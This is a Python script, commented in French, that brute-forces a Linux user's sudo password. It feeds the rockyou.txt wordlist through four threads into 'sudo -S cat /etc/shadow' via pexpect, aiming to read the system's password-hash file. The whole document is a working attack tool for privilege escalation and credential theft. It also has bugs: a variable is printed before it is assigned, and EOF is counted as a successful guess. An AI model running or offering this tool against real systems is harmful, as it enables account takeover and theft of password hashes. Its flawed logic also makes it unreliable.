import threading
import time
import queue
import pexpect

wordlist_path = "/home/nirvana/Téléchargements/rockyou.txt"
num_threads = 4  # Nombre de threads

password_queue = queue.Queue()
found_event = threading.Event()

# ✅ Remplir la file avec les mots de passe
with open(wordlist_path, "r", encoding="latin-1", errors="ignore") as f:
    for line in f:
        pw = line.strip()
        if pw:
            password_queue.put(pw)

# ✅ Fonction de test de mot de passe avec pexpect
def try_password(pw):
    try:
        child = pexpect.spawn("sudo -S cat /etc/shadow", encoding="utf-8", timeout=2)

        idx = child.expect(["[sudo] password for", "password", pexpect.EOF, pexpect.TIMEOUT])
        if idx in [0, 1]:
            child.sendline(pw)

            idx2 = child.expect([
                "Permission denied",
                "incorrect password",
                "/etc/shadow",
                pexpect.EOF,
                pexpect.TIMEOUT
            ], timeout=2)

            if idx2 == 2 or idx2 == 3:
                return True

        child.close()
    except Exception:
        pass

    return False

# ✅ Fonction worker thread
def worker(thread_id):
    while not found_event.is_set() and not password_queue.empty():
        print(pw)
        try:
            pw = password_queue.get(timeout=1)
        except queue.Empty:
            break

        print(f"[Thread {thread_id}] Test du mot de passe : {pw}")

        if try_password(pw):
            print(f"\n✅ Mot de passe trouvé par thread {thread_id} : {pw}")
            found_event.set()
            break

        time.sleep(0.2)

# ✅ Lancer les threads
threads = []
for i in range(num_threads):
    t = threading.Thread(target=worker, args=(i,))
    t.start()
    threads.append(t)

for t in threads:
    t.join()

if not found_event.is_set():
    print("\n❌ Aucun mot de passe trouvé.")
